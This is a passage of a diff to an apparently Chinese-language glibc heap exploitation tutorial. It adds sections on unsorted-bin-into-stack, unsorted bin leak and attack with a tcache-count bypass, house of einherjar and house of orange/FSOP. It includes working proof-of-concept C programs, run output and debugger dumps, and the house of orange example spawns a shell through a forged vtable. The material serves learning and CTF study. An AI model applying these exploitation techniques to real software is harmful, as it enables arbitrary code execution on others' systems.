@@ -88,7 +88,7 @@ Size: 0x20fa0 (with flag bits: 0x20fa1)
 
 
 
-### fastbin_dup_into_stack
+### fastbin_dup_into_stack(double free)
 
 `double free`的利用：
 
@@ -1942,11 +1942,124 @@ gef➤  x/12gx 0x602010+0xfffffffffffff050
 0x6010b0:    0x0000000000000000    0x0000000000000f69  <-- top chunk
 ```
 
+### unsorted_bin_into_stack
 
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    unsigned long stack_buf[4] = {0};
+
+    unsigned long *victim  = malloc(0x80);
+    unsigned long *p1 = malloc(0x10);
+    fprintf(stderr, "Allocating the victim chunk at %p\n", victim);
+
+    // deal with tcache
+    // int *k[10], i;
+    // for (i = 0; i < 7; i++) {
+    //     k[i] = malloc(0x80);
+    // }
+    // for (i = 0; i < 7; i++) {
+    //     free(k[i]);
+    // }
+
+    free(victim);
+    fprintf(stderr, "Freeing the chunk, it will be inserted in the unsorted bin\n\n");
+
+    stack_buf[1] = 0x100 + 0x10;
+    stack_buf[3] = (unsigned long)stack_buf;        // or any other writable address
+    fprintf(stderr, "Create a fake chunk on the stack\n");
+    fprintf(stderr, "fake->size: %p\n", (void *)stack_buf[1]);
+    fprintf(stderr, "fake->bk: %p\n\n", (void *)stack_buf[3]);
+
+    victim[1] = (unsigned long)stack_buf;
+    fprintf(stderr, "Now we overwrite the victim->bk pointer to stack: %p\n\n", stack_buf);
+
+    fprintf(stderr, "Malloc a chunk which size is 0x110 will return the region of our fake chunk: %p\n", &stack_buf[2]);
+
+    unsigned long *fake = malloc(0x100);
+    fprintf(stderr, "malloc(0x100): %p\n", fake);
+}
+```
+
+```c
+$ gcc -g unsorted_bin_into_stack.c
+$ ./a.out
+Allocating the victim chunk at 0x17a1010
+Freeing the chunk, it will be inserted in the unsorted bin
+
+Create a fake chunk on the stack
+fake->size: 0x110
+fake->bk: 0x7fffcd906480
+
+Now we overwrite the victim->bk pointer to stack: 0x7fffcd906480
+
+Malloc a chunk which size is 0x110 will return the region of our fake chunk: 0x7fffcd906490
+malloc(0x100): 0x7fffcd906490
+```
+
+unsorted-bin-into-stack 通过改写 unsorted bin 里 chunk 的 bk 指针到任意地址，从而在栈上 malloc 出 chunk。
+
+首先将一个 chunk 放入 unsorted bin，并且在栈上伪造一个 chunk：
+
+```c
+gdb-peda$ x/6gx victim - 2
+0x602000:    0x0000000000000000    0x0000000000000091  <-- victim chunk
+0x602010:    0x00007ffff7dd1b78    0x00007ffff7dd1b78
+0x602020:    0x0000000000000000    0x0000000000000000
+gdb-peda$ x/4gx stack_buf
+0x7fffffffdbc0:    0x0000000000000000    0x0000000000000110  <-- fake chunk
+0x7fffffffdbd0:    0x0000000000000000    0x00007fffffffdbc0
+```
+
+然后假设有一个漏洞，可以改写 victim chunk 的 bk 指针，那么将其改为指向 fake chunk：
+
+```c
+gdb-peda$ x/6gx victim - 2
+0x602000:    0x0000000000000000    0x0000000000000091  <-- victim chunk
+0x602010:    0x00007ffff7dd1b78    0x00007fffffffdbc0    <-- bk pointer
+0x602020:    0x0000000000000000    0x0000000000000000
+gdb-peda$ x/4gx stack_buf
+0x7fffffffdbc0:    0x0000000000000000    0x0000000000000110  <-- fake chunk
+0x7fffffffdbd0:    0x0000000000000000    0x00007fffffffdbc0
+```
+
+那么此时就相当于 fake chunk 已经被链接到 unsorted bin 中。在下一次 malloc 的时候，malloc 会顺着 bk 指针进行遍历，于是就找到了大小正好合适的 fake chunk：
+
+```c
+gdb-peda$ x/6gx victim - 2
+0x602000:    0x0000000000000000    0x0000000000000091  <-- victim chunk
+0x602010:    0x00007ffff7dd1bf8    0x00007ffff7dd1bf8
+0x602020:    0x0000000000000000    0x0000000000000000
+gdb-peda$ x/4gx fake - 2
+0x7fffffffdbc0:    0x0000000000000000    0x0000000000000110  <-- fake chunk
+0x7fffffffdbd0:    0x00007ffff7dd1b78    0x00007fffffffdbc0
+```
+
+fake chunk 被取出，而 victim chunk 被从 unsorted bin 中取出来放到了 small bin 中。另外值得注意的是 fake chunk 的 fd 指针被修改了，这是 unsorted bin 的地址，通过它可以泄露 libc 地址
+
+而在libc 2.27中，我们应该伪造fake chunk的bk指向自己，因为libc 2.27添加的Tcache机制会尝试将 Unsorted Bin 中所有同大小的 chunk 都“捞”出来，填满 Tcache，直到 Tcache 满或者 Unsorted Bin 遍历完，只有填满后，才会把最后一个取出来的 chunk 返回给用户。
+
+因此我们将fake chunk的bk指向自己，Tcache会将fake chunk循环填满自己
 
 
 
 ### unsorted_bin_attack
+
+#### leak
+
+首先关于unsorted bin的leak，我们以拥有两个chunk的unsorted bin为例：
+
+![img](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/gdb-debug-state.png)
+
+我们可以看到，在该链表中必有一个节点（不准确的说，是尾节点，这个就意会一下把，毕竟循环链表实际上没有头尾）的 `fd` 指针会指向 `main_arena` 结构体内部，通过main_arena可以泄露libc，同时如果有多个chunk，则可以泄露出heap地址
+
+```c
+main_arena_offset = ELF("libc.so.6").symbols["__malloc_hook"] + 0x10
+```
+
+![img](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/unsorted_bin_attack_order.png)
 
 ```c
 #include <stdio.h>
@@ -1994,6 +2107,10 @@ unlink 的对 unsorted bin 的操作是这样的：
 ```
 
 其中 `bck = victim->bk`
+
+攻击点就在第 2 步：`bck->fd = unsorted_chunks(av);`
+
+如果我们能控制 `victim->bk`（即 `bck`），我们就能让 `bck->fd` 指向任意地址。 glibc 会把 `unsorted_chunks(av)` 的地址（一个很大的 libc 地址）写到 `bck->fd` 所在的位置。
 
 首先分配两个 chunk，然后释放掉第一个，它将被加入到 unsorted bin 中：
 
@@ -2096,7 +2213,9 @@ Now write its bk ptr with the target address-0x10: 0x7ffef0884c00
 Finally malloc again to get the chunk at target address: 0x7ffef0884c10 -> 0x7f69ba1d8ca0
 ```
 
-我们知道由于 tcache 的存在，malloc 从 unsorted bin 取 chunk 的时候，如果对应的 tcache bin 还未装满，则会将 unsorted bin 里的 chunk 全部放进对应的 tcache bin，然后再从 tcache bin 中取出。那么问题就来了，在放进 tcache bin 的这个过程中，malloc 会以为我们的 target address 也是一个 chunk，然而这个 "chunk" 是过不了检查的，将抛出 "memory corruption" 的错误：
+Tcache Bin 未满 (Count < 7)时，当 `malloc` 从 Unsorted Bin 拿到 chunk 时，它会尝试把 Unsorted Bin 里剩下的同大小 chunk 全部填充进 Tcache。
+
+**后果**：由于我们修改了 `bk` 指针指向栈上的 `target_addr`，glibc 会尝试把 `target_addr` 当作一个 chunk 放入 Tcache。这会触发 chunk 大小检查（`chunksize(victim)`），因为栈上的数据通常不符合 chunk 头部的格式，导致程序崩溃（`memory corruption`）。
 
 ```c
       while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
@@ -2108,11 +2227,1057 @@ Finally malloc again to get the chunk at target address: 0x7ffef0884c10 -> 0x7f6
             malloc_printerr ("malloc(): memory corruption");
 ```
 
+Tcache Bin 不为空：如果对应的 Tcache Bin 里有东西，`malloc` 会直接从 Tcache 取出并在开头返回，根本不会执行到 Unsorted Bin 的逻辑。
+
+后果：无法触发 Unsorted Bin 的 Unlink 操作，攻击失效。
+
+```c
+  if (tc_idx < mp_.tcache_bins
+      /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */
+      && tcache
+      && tcache->entries[tc_idx] != NULL)
+    {
+      return tcache_get (tc_idx);
+    }
+```
+
+为了绕过这个矛盾检查，我们采取通过tcache poisoning的方式将tcache的count修改为0xff
+
+```c
+free(p);        // 1. p 进入 tcache, count = 1
+p[0] = &stack;  // 2. 修改 p->next 指向栈 (Tcache Poisoning)
+malloc(0x80);   // 3. 取出 p, count = 0
+malloc(0x80);   // 4. 取出 stack, count = -1 (即 0xff 或 0xffff) !!!
+```
+
+此时在进行到下面这里时就会进入 else 分支，直接取出 chunk 并返回：
+
+```c
+#if USE_TCACHE
+          /* Fill cache first, return to user only if cache fills.
+         We may return one of these chunks later.  */
+          if (tcache_nb
+          && tcache->counts[tc_idx] < mp_.tcache_count)
+        {
+          tcache_put (victim, tc_idx);
+          return_cached = 1;
+          continue;
+        }
+          else
+        {
+#endif
+              check_malloced_chunk (av, victim, nb);
+              void *p = chunk2mem (victim);
+              alloc_perturb (p, bytes);
+              return p;
+```
+
+于是就成功泄露出了 unsorted bin 的头部地址。
+
+### house_of_einherjar
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <malloc.h>
+
+int main() {
+    uint8_t *a, *b, *d;
+
+    a = (uint8_t*) malloc(0x10);
+    int real_a_size = malloc_usable_size(a);
+    memset(a, 'A', real_a_size);
+    fprintf(stderr, "We allocate 0x10 bytes for 'a': %p\n\n", a);
+
+    size_t fake_chunk[6];
+    fake_chunk[0] = 0x80;
+    fake_chunk[1] = 0x80;
+    fake_chunk[2] = (size_t) fake_chunk;
+    fake_chunk[3] = (size_t) fake_chunk;
+    fake_chunk[4] = (size_t) fake_chunk;
+    fake_chunk[5] = (size_t) fake_chunk;
+    fprintf(stderr, "Our fake chunk at %p looks like:\n", fake_chunk);
+    fprintf(stderr, "prev_size: %#lx\n", fake_chunk[0]);
+    fprintf(stderr, "size: %#lx\n", fake_chunk[1]);
+    fprintf(stderr, "fwd: %#lx\n", fake_chunk[2]);
+    fprintf(stderr, "bck: %#lx\n", fake_chunk[3]);
+    fprintf(stderr, "fwd_nextsize: %#lx\n", fake_chunk[4]);
+    fprintf(stderr, "bck_nextsize: %#lx\n\n", fake_chunk[5]);
+
+    b = (uint8_t*) malloc(0xf8);
+    int real_b_size = malloc_usable_size(b);
+    uint64_t* b_size_ptr = (uint64_t*)(b - 0x8);
+    fprintf(stderr, "We allocate 0xf8 bytes for 'b': %p\n", b);
+    fprintf(stderr, "b.size: %#lx\n", *b_size_ptr);
+    fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'\n");
+    a[real_a_size] = 0;
+    fprintf(stderr, "b.size: %#lx\n\n", *b_size_ptr);
+
+    size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
+    *(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;
+    fprintf(stderr, "We write a fake prev_size to the last %lu bytes of a so that it will consolidate with our fake chunk\n", sizeof(size_t));
+    fprintf(stderr, "Our fake prev_size will be %p - %p = %#lx\n\n", b-sizeof(size_t)*2, fake_chunk, fake_size);
+
+    fake_chunk[1] = fake_size;
+    fprintf(stderr, "Modify fake chunk's size to reflect b's new prev_size\n");
+
+    fprintf(stderr, "Now we free b and this will consolidate with our fake chunk\n");
+    free(b);
+    fprintf(stderr, "Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", fake_chunk[1]);
+
+    d = malloc(0x10);
+    memset(d, 'A', 0x10);
+    fprintf(stderr, "\nNow we can call malloc() and it will begin in our fake chunk: %p\n", d);
+}
+
+$ gcc -g house_of_einherjar.c
+$ ./a.out
+We allocate 0x10 bytes for 'a': 0xb31010
+
+Our fake chunk at 0x7ffdb337b7f0 looks like:
+prev_size: 0x80
+size: 0x80
+fwd: 0x7ffdb337b7f0
+bck: 0x7ffdb337b7f0
+fwd_nextsize: 0x7ffdb337b7f0
+bck_nextsize: 0x7ffdb337b7f0
+
+We allocate 0xf8 bytes for 'b': 0xb31030
+b.size: 0x101
+We overflow 'a' with a single null byte into the metadata of 'b'
+b.size: 0x100
+
+We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk
+Our fake prev_size will be 0xb31020 - 0x7ffdb337b7f0 = 0xffff80024d7b5830
+
+Modify fake chunk's size to reflect b's new prev_size
+Now we free b and this will consolidate with our fake chunk
+Our fake chunk size is now 0xffff80024d7d6811 (b.size + fake_prev_size)
+
+Now we can call malloc() and it will begin in our fake chunk: 0x7ffdb337b800
+```
+
+house-of-einherjar 是一种利用 malloc 来返回一个附近地址的任意指针。它要求有一个单字节溢出漏洞，覆盖掉 next chunk 的 size 字段并清除 `PREV_IN_USE` 标志，然后还需要覆盖 prev_size 字段为 fake chunk 的大小。当 next chunk 被释放时，它会发现前一个 chunk 被标记为空闲状态，然后尝试合并堆块。只要我们精心构造一个 fake chunk，让合并后的堆块范围到 fake chunk 处，那下一次 malloc 将返回我们想要的地址。比起前面所讲过的 poison-null-byte ，更加强大，但是要求的条件也更多一点，比如一个堆信息泄漏。
+
+首先分配一个假设存在 off_by_one 溢出的 chunk a，然后在栈上创建我们的 fake chunk，chunk 大小随意，只要是 small chunk 就可以了：
+
+```c
+gef➤  x/8gx a-0x10
+0x603000:    0x0000000000000000    0x0000000000000021  <-- chunk a
+0x603010:    0x4141414141414141    0x4141414141414141
+0x603020:    0x4141414141414141    0x0000000000020fe1  <-- top chunk
+0x603030:    0x0000000000000000    0x0000000000000000
+gef➤  x/8gx &fake_chunk
+0x7fffffffdcb0:    0x0000000000000080    0x0000000000000080  <-- fake chunk
+0x7fffffffdcc0:    0x00007fffffffdcb0    0x00007fffffffdcb0
+0x7fffffffdcd0:    0x00007fffffffdcb0    0x00007fffffffdcb0
+0x7fffffffdce0:    0x00007fffffffddd0    0xffa7b97358729300
+```
+
+接下来创建 chunk b，并利用 chunk a 的溢出将 size 字段覆盖掉，清除了 `PREV_INUSE` 标志，chunk b 就会以为前一个 chunk 是一个 free chunk 了：
+
+```c
+gef➤  x/8gx a-0x10
+0x603000:    0x0000000000000000    0x0000000000000021  <-- chunk a
+0x603010:    0x4141414141414141    0x4141414141414141
+0x603020:    0x4141414141414141    0x0000000000000100  <-- chunk b
+0x603030:    0x0000000000000000    0x0000000000000000
+```
+
+原本 chunk b 的 size 字段应该为 0x101，在这里我们选择 malloc(0xf8) 作为 chunk b 也是出于方便的目的，覆盖后只影响了标志位，没有影响到大小。
+
+接下来根据 fake chunk 在栈上的位置修改 chunk b 的 prev_size 字段。计算方法是用 chunk b 的起始地址减去 fake chunk 的起始地址，同时为了绕过检查，还需要将 fake chunk 的 size 字段与 chunk b 的 prev_size 字段相匹配：
+
+```c
+gef➤  x/8gx a-0x10
+0x603000:    0x0000000000000000    0x0000000000000021  <-- chunk a
+0x603010:    0x4141414141414141    0x4141414141414141
+0x603020:    0xffff800000605370    0x0000000000000100  <-- chunk b <-- prev_size
+0x603030:    0x0000000000000000    0x0000000000000000
+gef➤  x/8gx &fake_chunk
+0x7fffffffdcb0:    0x0000000000000080    0xffff800000605370  <-- fake chunk <-- size
+0x7fffffffdcc0:    0x00007fffffffdcb0    0x00007fffffffdcb0
+0x7fffffffdcd0:    0x00007fffffffdcb0    0x00007fffffffdcb0
+0x7fffffffdce0:    0x00007fffffffddd0    0xadeb3936608e0600
+```
+
+释放 chunk b，这时因为 `PREV_INUSE` 为零，unlink 会根据 prev_size 去寻找上一个 free chunk，并将它和当前 chunk 合并。从 arena 里可以看到：
+
+```c
+gef➤  heap arenas
+Arena (base=0x7ffff7dd1b20, top=0x7fffffffdcb0, last_remainder=0x0, next=0x7ffff7dd1b20, next_free=0x0, system_mem=0x21000)
+```
+
+最后当我们再次 malloc，其返回的地址将是 fake chunk 的地址：
+
+```c
+gef➤  x/8gx &fake_chunk
+0x7fffffffdcb0:    0x0000000000000080    0x0000000000000021  <-- chunk d
+0x7fffffffdcc0:    0x4141414141414141    0x4141414141414141
+0x7fffffffdcd0:    0x00007fffffffdcb0    0xffff800000626331
+0x7fffffffdce0:    0x00007fffffffddd0    0xbdf40e22ccf46c00
+```
+
+### house_of_orange
+
+House of Orange 的利用可以分为三个主要阶段：
+
+1. 修改 Top Chunk 大小，触发 `sysmalloc` 中的 `_int_free`，强行将 Top Chunk 放入 Unsorted Bin（实现无 `free` 释放）。
+2. 利用被释放到 Unsorted Bin 的 chunk，修改其bk指针，修改 libc 中的全局变量 `_IO_list_all` 指针。
+3. 伪造 `_IO_FILE` 结构体和虚表 (vtable)，通过触发 `malloc` 报错引发 `abort`，最终在 `_IO_flush_all_lockp` 中劫持控制流。
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int winner (char *ptr);
+
+int main() {
+    char *p1, *p2;
+    size_t io_list_all, *top;
+
+    p1 = malloc(0x400 - 0x10);
+
+    top = (size_t *) ((char *) p1 + 0x400 - 0x10);
+    top[1] = 0xc01;
+
+    p2 = malloc(0x1000);
+    io_list_all = top[2] + 0x9a8;
+    top[3] = io_list_all - 0x10;
+
+    memcpy((char *) top, "/bin/sh\x00", 8);
+
+    top[1] = 0x61;
+
+    _IO_FILE *fp = (_IO_FILE *) top;
+    fp->_mode = 0; // top+0xc0
+    fp->_IO_write_base = (char *) 2; // top+0x20
+    fp->_IO_write_ptr = (char *) 3; // top+0x28
+
+    size_t *jump_table = &top[12]; // controlled memory
+    jump_table[3] = (size_t) &winner;
+    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8
+
+    malloc(1);
+    return 0;
+}
+
+int winner(char *ptr) {
+    system(ptr);
+    return 0;
+}
+```
+
+```c
+$ gcc -g house_of_orange.c
+$ ./a.out
+*** Error in `./a.out': malloc(): memory corruption: 0x00007f3daece3520 ***
+======= Backtrace: =========
+/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f3dae9957e5]
+/lib/x86_64-linux-gnu/libc.so.6(+0x8213e)[0x7f3dae9a013e]
+/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f3dae9a2184]
+./a.out[0x4006cc]
+/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f3dae93e830]
+./a.out[0x400509]
+======= Memory map: ========
+00400000-00401000 r-xp 00000000 08:01 919342                             /home/firmy/how2heap/a.out
+00600000-00601000 r--p 00000000 08:01 919342                             /home/firmy/how2heap/a.out
+00601000-00602000 rw-p 00001000 08:01 919342                             /home/firmy/how2heap/a.out
+01e81000-01ec4000 rw-p 00000000 00:00 0                                  [heap]
+7f3da8000000-7f3da8021000 rw-p 00000000 00:00 0
+7f3da8021000-7f3dac000000 ---p 00000000 00:00 0
+7f3dae708000-7f3dae71e000 r-xp 00000000 08:01 398989                     /lib/x86_64-linux-gnu/libgcc_s.so.1
+7f3dae71e000-7f3dae91d000 ---p 00016000 08:01 398989                     /lib/x86_64-linux-gnu/libgcc_s.so.1
+7f3dae91d000-7f3dae91e000 rw-p 00015000 08:01 398989                     /lib/x86_64-linux-gnu/libgcc_s.so.1
+7f3dae91e000-7f3daeade000 r-xp 00000000 08:01 436912                     /lib/x86_64-linux-gnu/libc-2.23.so
+7f3daeade000-7f3daecde000 ---p 001c0000 08:01 436912                     /lib/x86_64-linux-gnu/libc-2.23.so
+7f3daecde000-7f3daece2000 r--p 001c0000 08:01 436912                     /lib/x86_64-linux-gnu/libc-2.23.so
+7f3daece2000-7f3daece4000 rw-p 001c4000 08:01 436912                     /lib/x86_64-linux-gnu/libc-2.23.so
+7f3daece4000-7f3daece8000 rw-p 00000000 00:00 0
+7f3daece8000-7f3daed0e000 r-xp 00000000 08:01 436908                     /lib/x86_64-linux-gnu/ld-2.23.so
+7f3daeef4000-7f3daeef7000 rw-p 00000000 00:00 0
+7f3daef0c000-7f3daef0d000 rw-p 00000000 00:00 0
+7f3daef0d000-7f3daef0e000 r--p 00025000 08:01 436908                     /lib/x86_64-linux-gnu/ld-2.23.so
+7f3daef0e000-7f3daef0f000 rw-p 00026000 08:01 436908                     /lib/x86_64-linux-gnu/ld-2.23.so
+7f3daef0f000-7f3daef10000 rw-p 00000000 00:00 0
+7ffe8eba6000-7ffe8ebc7000 rw-p 00000000 00:00 0                          [stack]
+7ffe8ebee000-7ffe8ebf1000 r--p 00000000 00:00 0                          [vvar]
+7ffe8ebf1000-7ffe8ebf3000 r-xp 00000000 00:00 0                          [vdso]
+ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
+$ whoami
+firmy
+$ exit
+Aborted (core dumped)
+```
+
+house of orange是在程序缺少free的时候通过top chunk的扩充机制制造修改后的chunk free进入unsorted bin，以此来泄露libc地址，同时通过unsorted bin attack来修改_IO_list_all指针，通过FSOP来getshell
+
+它要求能够泄漏堆和 libc。我们知道一开始的时候，整个堆都属于 top chunk，每次申请内存时，就从 top chunk 中划出请求大小的堆块返回给用户，于是 top chunk 就越来越小。
+
+当某一次 top chunk 的剩余大小已经不能够满足请求时，就会调用函数 `sysmalloc()` 分配新内存，这时可能会发生两种情况，一种是直接扩充 top chunk，另一种是调用 mmap 分配一块新的 top chunk。具体调用哪一种方法是由申请大小决定的，为了能够使用前一种扩展 top chunk，需要满足以下检查
+
+**大小不足**：伪造的大小必须小于用户请求的大小 + `MINSIZE`。这里 `0xc01 < 0x1000`，满足。
+
+**页对齐**：`Old_Top + Old_Size` 必须是页对齐的（通常是 4K 对齐）。
+
+原 Top 地址通常以 `x00` 结尾，加上 `0xc00` 依然对齐。
+
+**Prev_inuse 位**：Size 的最低位必须为 1 (PREV_INUSE)，防止向前合并。
+
+**最小尺寸**：Size 必须大于 `MINSIZE` (0x10)。
+
+
+
+首先分配一个大小为 0x400 的 chunk：
+
+```c
+Allocated chunk | PREV_INUSE
+Addr: 0x602000
+Size: 0x400 (with flag bits: 0x401)
+
+Top chunk | PREV_INUSE
+Addr: 0x602400
+Size: 0x20c00 (with flag bits: 0x20c01)
+```
+
+默认情况下，top chunk 大小为 0x21000，减去 0x400，所以此时的大小为 0x20c00，另外 PREV_INUSE 被设置。
+
+现在通过溢出漏洞，可以修改 top chunk 的数据，于是我们将 size 字段修改为 0xc01。这样就可以满足上面所说的条件：
+
+```c
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x602000
+Size: 0x400 (with flag bits: 0x401)
+
+Top chunk | PREV_INUSE
+Addr: 0x602400
+Size: 0xc00 (with flag bits: 0xc01)
+    
+pwndbg> x/20gx 0x602400
+0x602400:       0x0000000000000000      0x0000000000000c01
+0x602410:       0x0000000000000000      0x0000000000000000
+```
+
+紧接着，申请一块大内存，此时由于修改后的 top chunk size 不能满足需求，则调用 sysmalloc 的第一种方法扩充 top chunk，结果是在 old_top 后面新建了一个 top chunk 用来存放 new_top，然后将 old_top 释放，即被添加到了 unsorted bin 中：
+
+```c
+Allocated chunk | PREV_INUSE
+Addr: 0x602000
+Size: 0x400 (with flag bits: 0x401)
+
+Free chunk (unsortedbin) | PREV_INUSE
+Addr: 0x602400
+Size: 0xbe0 (with flag bits: 0xbe1)
+fd: 0x7ffff7bc4b78
+bk: 0x7ffff7bc4b78
+
+Allocated chunk
+Addr: 0x602fe0
+Size: 0x10 (with flag bits: 0x10)	<-- fencepost chunk 1
+
+Allocated chunk | PREV_INUSE
+Addr: 0x602ff0
+Size: 0x10 (with flag bits: 0x11)	<-- fencepost chunk 2
+
+Allocated chunk
+Addr: 0x603000
+Size: 0x00 (with flag bits: 0x00)
+```
+
+于是就泄漏出了 libc 地址。另外可以看到 old top chunk 被缩小了 0x20，缩小的空间被用于放置 fencepost chunk。此时的堆空间应该是这样的：
+
+```text
++---------------+
+|       p1      |
++---------------+
+|  old top-0x20 |
++---------------+
+|  fencepost 1  |
++---------------+
+|  fencepost 2  |
++---------------+
+|      ...      |
++---------------+
+|       p2      |
++---------------+
+|    new top    |
++---------------+
+```
+
+根据放入 unsorted bin 中 old top chunk 的 fd/bk 指针，可以推算出 `_IO_list_all` 的地址。然后通过溢出将 old top 的 bk 改写为 `_IO_list_all-0x10`，这样在进行 unsorted bin attack 时，就会将 `_IO_list_all` 修改为 `&unsorted_bin-0x10`：
+
+malloc前：
+
+```c
+Free chunk (unsortedbin) | PREV_INUSE
+Addr: 0x602400
+Size: 0x60 (with flag bits: 0x61)
+fd: 0x7ffff7bc4b78
+bk: 0x7ffff7bc5510
+
+pwndbg> x/20gx 0x7ffff7bc5510
+0x7ffff7bc5510: 0x0000000000000000      0x0000000000000000
+0x7ffff7bc5520 <_IO_list_all>:  0x00007ffff7bc5540      0x0000000000000000
+```
+
+malloc后：
+
+因为进行了
+
+```c
+bck = victim->bk;
+unsorted_chunks(av)->bk = bck;
+bck->fd = unsorted_chunks(av);    
+```
+
+成功修改_IO_list_all为main_arena+88
+
+#### FSOP
+
+FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值。FILE结构体是包裹在_IO_FILE_plus中的，两个结构体定义如下：
+
+```c
+struct _IO_FILE_plus
+{
+    _IO_FILE    file;
+    IO_jump_t   *vtable;
+}
+```
+
+```c
+struct _IO_FILE {
+  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
+#define _IO_file_flags _flags
+
+  /* The following pointers correspond to the C++ streambuf protocol. */
+  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
+  char* _IO_read_ptr;   /* Current read pointer */
+  char* _IO_read_end;   /* End of get area. */
+  char* _IO_read_base;  /* Start of putback+get area. */
+  char* _IO_write_base; /* Start of put area. */
+  char* _IO_write_ptr;  /* Current put pointer. */
+  char* _IO_write_end;  /* End of put area. */
+  char* _IO_buf_base;   /* Start of reserve area. */
+  char* _IO_buf_end;    /* End of reserve area. */
+  /* The following fields are used to support backing up and undo. */
+  char *_IO_save_base; /* Pointer to start of non-current get area. */
+  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
+  char *_IO_save_end; /* Pointer to end of non-current get area. */
+
+  struct _IO_marker *_markers;
+
+  struct _IO_FILE *_chain;
+
+  int _fileno;
+#if 0
+  int _blksize;
+#else
+  int _flags2;
+#endif
+  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */
+
+#define __HAVE_COLUMN /* temporary */
+  /* 1+column number of pbase(); 0 is unknown. */
+  unsigned short _cur_column;
+  signed char _vtable_offset;
+  char _shortbuf[1];
+
+  /*  char* _save_gptr;  char* _save_egptr; */
+
+  _IO_lock_t *_lock;
+#ifdef _IO_USE_OLD_IO_FILE
+};
+```
+
+进程中的FILE结构会通过_chain域彼此连接形成一个链表，链表头部用全局变量_IO_list_all表示，通过这个值可以遍历所有的FILE结构。包裹_IO_FILE结构的_IO_FILE_plus中，有一个重要的指针vtable，**vtable指向了一系列处理_IO_FILE文件流的函数指针**(修改指针来控制程序流)。实际上所有针对_IO_FILE_的攻击都是通过修改或者伪造vtable中的函数指针来实现的，因为类似fopen，fread，fwrite，printf，exit，malloc_printerr等对文件流进行操作的函数，最终的函数调用路径都会指向_IO_FILE_plus.vtable上的函数指针。
+
+vtable指向的跳转表是一种兼容C++虚函数的实现。当程序对某个流进行操作的时候，会调用该流对应的跳转表中的某个函数，_IO_jump_t 结构体如下所示：
+
+```c
+//glibc-2.23 ./libio/libioP.h
+struct _IO_jump_t
+{
+    JUMP_FIELD(size_t, __dummy);
+    JUMP_FIELD(size_t, __dummy2);
+    JUMP_FIELD(_IO_finish_t, __finish);
+    JUMP_FIELD(_IO_overflow_t, __overflow);
+    JUMP_FIELD(_IO_underflow_t, __underflow);
+    JUMP_FIELD(_IO_underflow_t, __uflow);
+    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
+    /* showmany */
+    JUMP_FIELD(_IO_xsputn_t, __xsputn);
+    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
+    JUMP_FIELD(_IO_seekoff_t, __seekoff);
+    JUMP_FIELD(_IO_seekpos_t, __seekpos);
+    JUMP_FIELD(_IO_setbuf_t, __setbuf);
+    JUMP_FIELD(_IO_sync_t, __sync);
+    JUMP_FIELD(_IO_doallocate_t, __doallocate);
+    JUMP_FIELD(_IO_read_t, __read);
+    JUMP_FIELD(_IO_write_t, __write);
+    JUMP_FIELD(_IO_seek_t, __seek);
+    JUMP_FIELD(_IO_close_t, __close);
+    JUMP_FIELD(_IO_stat_t, __stat);
+    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
+    JUMP_FIELD(_IO_imbue_t, __imbue);
+#if 0
+    get_column;
+    set_column;
+#endif
+};
+```
+
+house_of_orange.c中通过偏移来确定了io_list_all的值，即main_arena+88与io_list_all的偏移相差0x9a8字节。
+
+```c
+io_list_all = top[2] + 0x9a8;
+top[3] = io_list_all - 0x10;
+```
+
+top在前面被定义为了old top chunk的地址，这里top[2]的值就是unsortedbin中fd指针的值。
+
+top[2]+0x9a8的地址处，就是全局变量_IO_list_all的地址，修改unsortedbin chunk的bk指针为_IO_list_all的值
+
+在本例中，最终实现攻击的大致思路如下：glibc中定义了打印内存报错信息的函数malloc_printerr，malloc_printerr中实际起作用的是__libc_message函数中定义了abort函数，abort函数在中止进程的时候，会调用_IO_flush_all_lockp遍历刷新所有的文件流，然后会调用_IO_FILE_plus.vtable中的_IO_OVERFLOW函数处理_IO_FILE结构体指针fp。我们在堆区伪造一个_IO_FILE_plus结构体，_IO_FILE_plus.vtable中_IO_OVERFLOW的函数指针修改为system函数地址，_IO_FILE结构体0字节偏移处改写为"sh"或者“/bin/sh”，这时候_IO_OVERFLOW(fp,EOF)就相当于调用system("/bin/sh")。
+
+malloc_printerr函数调用链和具体代码实现如下：
+
+```c
+malloc_printerr --> __libc_message --> abort --> _IO_flush_all_lockp --> _IO_OVERFLOW
+```
+
+malloc_printerr函数定义在malloc.c中，malloc_printerr中真正起作用的函数，是__libc_message，__libc_message函数被定义在libc_fatal.c中。
+
+1. 一般在出现内存错误时，会调用函数 `malloc_printerr()` 打印出错信息，我们顺着代码一直跟踪下去：
+
+   ```c
+   static void
+   malloc_printerr (int action, const char *str, void *ptr, mstate ar_ptr)
+   {
+     [...]
+     if ((action & 5) == 5)
+       __libc_message (action & 2, "%s\n", str);
+     else if (action & 1)
+       {
+         char buf[2 * sizeof (uintptr_t) + 1];
+   
